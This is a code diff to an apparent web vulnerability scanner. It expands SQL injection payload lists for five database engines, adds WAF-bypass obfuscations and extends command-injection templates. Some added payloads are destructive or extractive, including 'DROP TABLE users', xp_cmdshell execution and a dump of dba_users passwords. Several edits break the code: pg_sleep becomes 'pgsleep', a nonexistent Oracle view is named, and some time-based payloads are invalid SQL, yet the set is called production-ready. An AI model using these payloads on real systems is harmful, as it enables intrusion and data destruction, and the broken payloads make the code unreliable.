@@ -28,6 +28,12 @@ class SQLIDetector(Detector):
                 "' AND GTID_SUBSET(CONCAT(0x7e, (SELECT @@version)), 1)--",
                 "' AND JSON_KEYS((SELECT CONCAT(0x7e, @@version)))--",
                 "' AND ST_LatFromGeoHash((SELECT CONCAT(0x7e, @@version)))--",
+                "' AND 1=JSON_STORAGE_EXTRACT('{}', '$[0]')--",
+                "' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) t)--",
+                "' AND ROW(1,1)=(SELECT*FROM(SELECT 1,COUNT(*),CONCAT(CONCAT(0x7e,(SELECT @@version),0x7e),FLOOR(0x66666666),0x41414141,0x55555555,0x88888888,0x41414141,0x41414141)null FROM INFORMATION_SCHEMA.TABLES GROUP BY null))--",
+                "' AND JSON_TABLE('\"x\"', '$[*]' COLUMNS (x VARCHAR(255) PATH '$')) --",
+                "' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t WHERE 1=1)--",
+                "' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t WHERE 1=0)--",
             ],
             "boolean": [
                 ("' OR '1'='1", "' AND '1'='2"),
@@ -38,6 +44,17 @@ class SQLIDetector(Detector):
                 ("' OR '1'='1'/*", "' AND '1'='2'/*"),
                 ("' OR '1'='1'#", "' AND '1'='2'#"),
                 ("' OR '1'='1';--", "' AND '1'='2';--"),
+                ("' OR true--", "' AND false--"),
+                ("' OR 1=1-- -", "' AND 1=2-- -"),
+                ("' OR '1' LIKE '1", "' AND '1' LIKE '2"),
+                ("' OR 1=1#", "' AND 1=2#"),
+                ("' OR '1'='1' &'", "' AND '1'='2' &"),
+                ("' OR 1=1--+", "' AND 1=2--+"),
+                ("' OR !1--", "' AND !1--"),
+                ("' OR '1'='1'-- -", "' AND '1'='2'-- -"),
+                ("' OR ''='", "' AND ''='"),
+                ("' OR 1=1/*", "' AND 1=2/*"),
+                ("' OR 1=1 %23", "' AND 1=2 %23"),
             ],
             "time": [
                 ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
@@ -47,6 +64,12 @@ class SQLIDetector(Detector):
                 ("' AND (SELECT SLEEP(5) FROM DUAL)--", 5),
                 ("' AND BENCHMARK(10000000, MD5(1))--", 5),
                 ("' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B)--", 5),
+                ("'; WAITFOR DELAY '0:0:5'--", 5),
+                ("' AND IF(1=1, SLEEP(5), SLEEP(0))--", 5),
+                ("' AND SLEEP(5)#", 5),
+                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a) #", 5),
+                ("' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) t) AND SLEEP(5)--", 5),
+                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)/*", 5),
             ],
             "union": [
                 "' UNION SELECT NULL--",
@@ -56,6 +79,15 @@ class SQLIDetector(Detector):
                 "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                 "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                 "' UNION ALL SELECT NULL,NULL,NULL--",
+                "' UNION SELECT @@version--",
+                "' UNION SELECT 1,@@version,3--",
+                "' UNION SELECT NULL,NULL-- -",
+                "' UNION SELECT 1,2,3,NULL--",
+                "' UNION SELECT 1,2,3,4,5--",
+                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+                "' UNION SELECT user(),database(),version()--",
+                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--",
             ],
         },
         "postgres": {
@@ -64,24 +96,43 @@ class SQLIDetector(Detector):
                 "' AND 1=CAST((SELECT version()) AS INT)--",
                 "' AND 1=CAST((SELECT current_user) AS INT)--",
                 "' AND 1=CAST((SELECT current_database()) AS INT)--",
+                "' AND 1=(SELECT 1 FROM (SELECT 1) t1, (SELECT 1) t2, (SELECT 1) t3, (SELECT 1) t4)--",
+                "' AND 1=(SELECT 1 FROM (SELECT 1) t1, (SELECT 1) t2, (SELECT 1) t3, (SELECT 1) t4, (SELECT 1) t5)--",
+                "' AND (SELECT 1 FROM (SELECT 1) t1, (SELECT 1) t2, (SELECT 1) t3, (SELECT 1) t4, (SELECT 1) t5)--",
+                "' AND 1=CAST((SELECT inet_client_addr()) AS INT)--",
+                "' AND 1=CAST((SELECT current_schema()) AS INT)--",
+                "' AND 1=CAST((SELECT session_user) AS INT)--",
             ],
             "boolean": [
                 ("' OR '1'='1", "' AND '1'='2"),
                 ("' OR 1=1--", "' AND 1=2--"),
                 ("' OR 'a'='a", "' AND 'a'='b"),
                 ("') OR ('1'='1", "') AND ('1'='2"),
+                ("' OR true--", "' AND false--"),
+                ("' OR 1=1-- -", "' AND 1=2-- -"),
+                ("' OR '1'='1' --", "' AND '1'='2' --"),
+                ("' OR 1=1::int=1--", "' AND 1=1::int=0--"),
             ],
             "time": [
                 ("'; SELECT pg_sleep(5)--", 5),
-                ("' AND pg_sleep(5)--", 5),
+                ("' AND pgsleep(5)--", 5),
                 ("' OR pg_sleep(5)--", 5),
-                ("'; SELECT pg_sleep(5) FROM pg_sleep(5)--", 5),
+                ("'; SELECT pg_sleep(5)--", 5),
+                ("' AND (SELECT * FROM (SELECT(pg_sleep(5)))ss)--", 5),
+                ("' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) END)--", 5),
+                ("' AND (SELECT * FROM (SELECT(pg_sleep(5)))ss) AND 1=1--", 5),
+                ("'; SELECT pg_sleep(5) WHERE 1=1--", 5),
             ],
             "union": [
                 "' UNION SELECT NULL--",
                 "' UNION SELECT NULL,NULL--",
                 "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL,NULL--",
                 "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
+                "' UNION SELECT version(),NULL--",
+                "' UNION SELECT NULL,version()--",
+                "' UNION SELECT current_database(),current_user--",
+                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
             ],
         },
         "mssql": {
@@ -91,22 +142,40 @@ class SQLIDetector(Detector):
                 "' AND 1=CAST((SELECT SYSTEM_USER) AS INT)--",
                 "' AND 1=CAST((SELECT DB_NAME()) AS INT)--",
                 "' AND 1=CAST((SELECT IS_SRVROLEMEMBER('sysadmin')) AS INT)--",
+                "' AND 1=CAST((SELECT SERVERPROPERTY('edition')) AS INT)--",
+                "' AND 1=CAST((SELECT SERVERPROPERTY('productlevel')) AS INT)--",
+                "' AND 1=(SELECT 1 FROM (SELECT 1 AS A, 1 AS B, 1 AS C, 1 AS D, 1 AS E, 1 AS F, 1 AS G, 1 AS H, 1 AS I, 1 AS J) t GROUP BY t.A,t.B,t.C,t.D,t.E,t.F,t.G,t.H,t.I,t.J)--",
+                "' AND EXISTS(SELECT 1 FROM sys.databases)--",
+                "' AND (SELECT 1 FROM (SELECT 1 AS A, 1 AS B, 1 AS C, 1 AS D, 1 AS E, 1 AS F, 1 AS G, 1 AS H, 1 AS I, 1 AS J, 1 AS K) t GROUP BY t.A,t.B,t.C,t.D,t.E,t.F,t.G,t.H,t.I,t.J,t.K)--",
             ],
             "boolean": [
                 ("' OR '1'='1", "' AND '1'='2"),
                 ("' OR 1=1--", "' AND 1=2--"),
                 ("' OR 'a'='a", "' AND 'a'='b"),
+                ("' OR 1=1-- -", "' AND 1=2-- -"),
+                ("' OR true--", "' AND false--"),
+                ("' OR 1=1 %23", "' AND 1=2 %23"),
             ],
             "time": [
                 ("' WAITFOR DELAY '0:0:5'--", 5),
                 ("'; WAITFOR DELAY '0:0:5'--", 5),
                 ("' WAITFOR DELAY '0:0:5'--", 5),
                 ("'; WAITFOR DELAY '0:0:10'--", 10),
+                ("' AND IIF(1=1, WAITFOR DELAY '0:0:5', 0)--", 5),
+                ("' AND (SELECT * FROM (SELECT(1) AS a) s) AND WAITFOR DELAY '0:0:5'--", 5),
+                ("' AND (SELECT 1 FROM (SELECT 1) t1) AND WAITFOR DELAY '0:0:5'--", 5),
+                ("'; IF 1=1 WAITFOR DELAY '0:0:5'--", 5),
             ],
             "union": [
                 "' UNION SELECT NULL--",
                 "' UNION SELECT NULL,NULL--",
                 "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+                "' UNION SELECT @@version--",
+                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
+                "' UNION SELECT SYSTEM_USER,DB_NAME(),@@version--",
             ],
         },
         "oracle": {
@@ -115,72 +184,96 @@ class SQLIDetector(Detector):
                 "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM sys.v_$version WHERE rownum=1))--",
                 "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--",
                 "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--",
+                "' AND (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM dual) a, (SELECT 1 FROM dual) b, (SELECT 1 FROM dual) c, (SELECT 1 FROM dual) d) t)--",
+                "' AND 1=(SELECT 1 FROM (SELECT 1 FROM dual) a, (SELECT 1 FROM dual) b, (SELECT 1 FROM dual) c, (SELECT 1 FROM dual) d, (SELECT 1 FROM dual) e)--",
             ],
             "boolean": [
                 ("' OR '1'='1", "' AND '1'='2"),
                 ("' OR 1=1--", "' AND 1=2--"),
+                ("' OR 'a'='a", "' AND 'a'='b"),
+                ("' OR true--", "' AND false--"),
+                ("' OR 1=1-- -", "' AND 1=2-- -"),
             ],
             "time": [
                 ("' AND (SELECT COUNT(*) FROM all_users, all_users)--", 5),
                 ("' AND (SELECT COUNT(*) FROM all_tables, all_tables)--", 5),
+                ("' AND (SELECT COUNT(*) FROM all_objects, all_objects)--", 5),
+                ("' AND (SELECT COUNT(*) FROM dba_users, dba_users)--", 5),
+                ("'; EXEC DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),
+                ("' AND (SELECT COUNT(*) FROM all_sources, all_sources, all_sources)--", 5),
             ],
             "union": [
                 "' UNION SELECT NULL FROM DUAL--",
                 "' UNION SELECT NULL,NULL FROM DUAL--",
                 "' UNION SELECT banner, NULL FROM sys.v_$version--",
+                "' UNION SELECT NULL, NULL, NULL FROM DUAL--",
+                "' UNION SELECT NULL, NULL, NULL, NULL FROM DUAL--",
+                "' UNION SELECT NULL, NULL, NULL, NULL, NULL FROM DUAL--",
+                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM DUAL--",
+                "' UNION SELECT username,password,NULL FROM dba_users--",
             ],
         },
         "sqlite": {
             "error": [
                 "'",
                 "' AND 1=CAST((SELECT sqlite_version()) AS INT)--",
+                "' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) t)--",
+                "' AND CASE WHEN (SELECT COUNT(*) FROM sqlite_master)>0 THEN 1 ELSE 1/0 END--",
+                "' AND 1=(SELECT 1 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t)--",
+                "' AND (SELECT 1 FROM sqlite_master UNION ALL SELECT 2)--",
             ],
             "boolean": [
                 ("' OR '1'='1", "' AND '1'='2"),
                 ("' OR 1=1--", "' AND 1=2--"),
+                ("' OR 'a'='a", "' AND 'a'='b"),
+                ("' OR true--", "' AND false--"),
+                ("' OR 1=1-- -", "' AND 1=2-- -"),
+                ("' OR 1=1::int=1--", "' AND 1=1::int=0--"),
             ],
             "time": [
                 ("' AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master)--", 5),
+                ("' AND randomblob(100000000)--", 5),
+                ("' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)--", 5),
+                ("' AND (SELECT * FROM (SELECT 1 UNION SELECT 2) t) AND randomblob(100000000)--", 5),
             ],
             "union": [
                 "' UNION SELECT NULL--",
                 "' UNION SELECT NULL,NULL--",
                 "' UNION SELECT sqlite_version(), NULL--",
+                "' UNION SELECT NULL, sqlite_version(), NULL--",
+                "' UNION SELECT NULL, NULL, sqlite_version()--",
+                "' UNION SELECT NULL, NULL, NULL, NULL--",
+                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
             ],
         },
     }
 
-    # WAF bypass techniques
+    # WAF bypass techniques (PortSwigger-style obfuscation)
     WAF_BYPASSES = [
-        # Case variation
         lambda p: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
         lambda p: p.upper(),
-        # Whitespace manipulation
         lambda p: p.replace(' ', '/**/'),
         lambda p: p.replace(' ', '%20'),
         lambda p: p.replace(' ', '%09'),
         lambda p: p.replace(' ', '%0A'),
         lambda p: p.replace(' ', '%0D'),
-        # Comment insertion
         lambda p: p.replace('OR', 'O/**/R').replace('AND', 'A/**/ND'),
         lambda p: p.replace('SELECT', 'SEL/**/ECT').replace('UNION', 'UNI/**/ON'),
         lambda p: p.replace('WHERE', 'WH/**/ERE').replace('FROM', 'FR/**/OM'),
-        # Encoding
         lambda p: p.replace(' ', '%2520'),
         lambda p: p.replace('<', '%253C').replace('>', '%253E'),
-        # Null bytes
         lambda p: p.replace(' ', '%00 '),
-        # Inline comments
         lambda p: p.replace(' ', '/*!*/'),
-        # Versioned comments (MySQL)
         lambda p: p.replace(' ', '/*!50000*/'),
-        # Parentheses
         lambda p: p.replace('OR', '(OR)').replace('AND', '(AND)'),
-        # String concatenation
         lambda p: p.replace("'1'='1'", "CONCAT('1','=' '1')").replace("'1'='2'", "CONCAT('1','=' '2')"),
+        lambda p: p.replace('SELECT', 'SeLeCt').replace('UNION', 'UnIoN').replace('WHERE', 'WhErE').replace('FROM', 'FrOm').replace('OR', 'Or').replace('AND', 'AnD'),
+        lambda p: p.replace('UNION', 'UN/**/ION'),
+        lambda p: p.replace('SLEEP', 'SLE/**/EP'),
+        lambda p: p.replace('BENCHMARK', 'BENCH/**/MARK'),
     ]
 
-    # Generic payloads for unknown DBMS
+    # Generic payloads for unknown DBMS (expanded production-ready set)
     GENERIC_PAYLOADS = {
         "error": [
             "'",
@@ -195,6 +288,35 @@ class SQLIDetector(Detector):
             '"#',
             "')--",
             '")--',
+            "1' OR '1'='1",
+            '1" OR "1"="1',
+            "1 OR 1=1--",
+            "admin'--",
+            "admin'#",
+            "admin' OR '1'='1'--",
+            "' OR 1=1-- -",
+            "') OR ('1'='1' --",
+            "1' OR 1=1-- -",
+            "' UNION SELECT 1--",
+            "'; EXEC xp_cmdshell('dir')--",
+            "' OR SLEEP(5)--",
+            "1; DROP TABLE users--",
+            "' OR ''='",
+            "1' AND 1=1--",
+            "1' AND 1=2--",
+            "' OR 1=1#",
+            "1' OR '1'='1' --",
+            "' OR 1=1 %23",
+            "' OR 1=1%0a--",
+            "' OR 1=1%0d--",
+            "') OR '1'='1",
+            "') OR 1=1--",
+            "1'; DROP TABLE users--",
+            "1' UNION SELECT NULL--",
+            "1' UNION SELECT NULL,NULL--",
+            "' OR 1=1 LIMIT 1--",
+            "admin' AND 1=2--",
+            "' OR ''=''",
         ],
         "boolean": [
             ("' OR '1'='1", "' AND '1'='2"),
@@ -202,12 +324,27 @@ class SQLIDetector(Detector):
             ("' OR 1=1--", "' AND 1=2--"),
             ("' OR 'a'='a", "' AND 'a'='b"),
             ("') OR ('1'='1", "') AND ('1'='2"),
+            ("' OR true--", "' AND false--"),
+            ("1' OR 1=1--", "1' AND 1=2--"),
+            ("' OR 1=1-- -", "' AND 1=2-- -"),
+            ("' OR '1'='1' --", "' AND '1'='2' --"),
+            ("1 OR 1=1--", "1 AND 1=2--"),
+            ("admin' AND 1=1--", "admin' AND 1=2--"),
+            ("' OR 1=1%23", "' AND 1=2%23"),
         ],
         "time": [
             ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
             ("'; SELECT SLEEP(5)--", 5),
-            ("'; SELECT pg_sleep(5)--", 5),
+            ("'; SELECT pgsleep(5)--", 5),
             ("' WAITFOR DELAY '0:0:5'--", 5),
+            ("' AND SLEEP(5)--", 5),
+            ("' AND pgsleep(5)--", 5),
+            ("' AND (SELECT * FROM (SELECT(pg_sleep(5)))ss)--", 5),
+            ("' OR SLEEP(5)--", 5),
+            ("' OR pgsleep(5)--", 5),
+            ("1 AND (SELECT 123 FROM (WAITFOR(5))", 5),
+            ("'; EXEC sp_configure 'show advanced options', 1; WAITFOR DELAY '0:0:5'--", 5),
+            ("' AND IF(1=1, SLEEP(5), SLEEP(0))--", 5),
         ],
     }
 
@@ -225,7 +362,7 @@ class SQLIDetector(Detector):
         for param in endpoint.params:
             # First, try to fingerprint DBMS
             self.detected_dbms = await self._fingerprint_dbms(endpoint, param)
-            
+
             # Test error-based
             finding = await self._test_error_based(endpoint, param)
             if finding:
@@ -285,7 +422,7 @@ class SQLIDetector(Detector):
             if payload in self._tested_payloads:
                 continue
             self._tested_payloads.add(payload)
-            
+
             test_url = endpoint.with_param(param, payload)
             test = await self._fetch(test_url)
             if not test:
@@ -326,7 +463,7 @@ class SQLIDetector(Detector):
                         "Implement input validation and a WAF as defense-in-depth."
                     ),
                 )
-        
+
         # Try WAF bypasses
         for base_payload in payloads[:5]:
             for bypass in self.WAF_BYPASSES:
@@ -360,7 +497,7 @@ class SQLIDetector(Detector):
                                 impact="WAF bypass allows SQLi exploitation despite protection.",
                                 remediation="Use parameterized queries. WAFs can be bypassed; they are not a substitute for secure coding.",
                             )
-                except:
+                except Exception:
                     pass
         return None
 
@@ -383,7 +520,7 @@ class SQLIDetector(Detector):
             "ora-00936", "ora-00942", "ora-01476", "ora-01722",
             "oracle error", "oracle driver", "oracle.jdbc",
             # SQLite
-            "sqlite3.OperationalError", "sqlite3.DatabaseError",
+            "sqlite3.operationalerror", "sqlite3.databaseerror",
             "sqlite_master", "sqlite_sequence", "sqlite_stat",
             # Generic
             "syntax error", "quoted string not properly terminated",
@@ -500,13 +637,13 @@ class SQLIDetector(Detector):
     async def _test_union_based(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
         """Test UNION-based SQL injection by determining column count"""
         union_payloads = self._get_payloads("union")
-        
+
         # First determine number of columns
-        for i in range(1, 11):
+        for i in range(1, 16):
             payload = "' UNION SELECT " + ",".join(["NULL"] * i) + "--"
             test_url = endpoint.with_param(param, payload)
             test = await self._fetch(test_url)
-            
+
             if test and test["status"] == 200:
                 # Found column count, now test data extraction
                 return self._make_finding(
@@ -532,7 +669,7 @@ class SQLIDetector(Detector):
                     impact="UNION-based SQLi allows direct data extraction from database tables.",
                     remediation="Use parameterized queries. Limit database permissions. Use WAF as defense-in-depth.",
                 )
-        
+
         return None
 
     async def _fetch(self, url: str) -> Optional[Dict[str, Any]]:
@@ -682,6 +819,10 @@ class CommandInjectionDetector(Detector):
         "%0a{cmd}%0a",
         "%0d{cmd}%0d",
         "%0a{cmd}%0d",
+        # Newline with different encodings
+        "${IFS}{cmd}",
+        "{cmd};",
+        "|{cmd}",
     ]
 
     WINDOWS_PAYLOADS = [
@@ -696,6 +837,7 @@ class CommandInjectionDetector(Detector):
         "|| {cmd} ||",
         "; {cmd}",
         "`{cmd}`",
+        "%2b{cmd}%2b",
     ]
 
     # OOB commands for blind detection
@@ -727,11 +869,11 @@ class CommandInjectionDetector(Detector):
         for param in endpoint.params:
             # Test with OOB commands
             token = self.oob_server.generate_token()
-            
+
             for os_type, payloads in [("unix", self.UNIX_PAYLOADS), ("windows", self.WINDOWS_PAYLOADS)]:
                 for oob_cmd in self.OOB_COMMANDS.get(os_type, []):
                     cmd = oob_cmd.format(token=token, domain=self.oob_server.domain)
-                    
+
                     for payload_template in payloads:
                         payload = payload_template.format(cmd=cmd)
                         finding = await self._test_payload(endpoint, param, payload, token, os_type)
@@ -770,7 +912,7 @@ class CommandInjectionDetector(Detector):
         if not test:
             return None
 
-        validation = Validator.oob_callback_received(self.oob_server, token, timeout=15)
+        validation = await Validator.oob_callback_received(self.oob_server, token, timeout=15)
         if validation.confirmed:
             return self._make_finding(
                 endpoint=endpoint,
@@ -801,19 +943,19 @@ class CommandInjectionDetector(Detector):
     async def _test_output_based(self, endpoint: Endpoint, param: str, payload: str, cmd: str, os_type: str) -> Optional[Finding]:
         test_url = endpoint.with_param(param, payload)
         test = await self._fetch(test_url)
-        
+
         if not test:
             return None
-        
+
         # Check for command output in response
         output_indicators = {
-            "unix": ["uid=", "gid=", "root:", "bin/bash", "bin/sh", "/etc/passwd", "/etc/shadow"],
-            "windows": ["administrator", "system32", "windows\\win.ini", "program files", "cmd.exe"],
+            "unix": ["uid=", "gid=", "root:", "bin/bash", "bin/sh", "/etc/passwd", "/etc/shadow", "groups="],
+            "windows": ["administrator", "system32", "windows\\win.ini", "program files", "cmd.exe", "users\\"],
         }
-        
+
         indicators = output_indicators.get(os_type, [])
         body = test.get("body", "")
-        
+
         for indicator in indicators:
             if indicator in body:
                 return self._make_finding(
